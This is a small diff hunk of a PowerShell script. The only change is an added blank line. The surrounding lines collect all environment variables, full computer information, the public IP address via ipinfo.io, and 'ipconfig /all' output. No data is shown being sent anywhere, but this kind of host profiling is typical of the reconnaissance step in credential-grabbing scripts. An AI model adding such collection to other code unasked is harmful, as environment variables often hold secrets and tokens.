@@ -18,6 +18,7 @@ $envVars = gci env: | ForEach-Object {
     "$key=$value"
 } | ConvertFrom-Csv -Delimiter '=' -Header Name, Value
 $extraInfo = (Get-ComputerInfo)
+
 $IPV4 = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
 $IPconfig = (ipconfig /all)
 
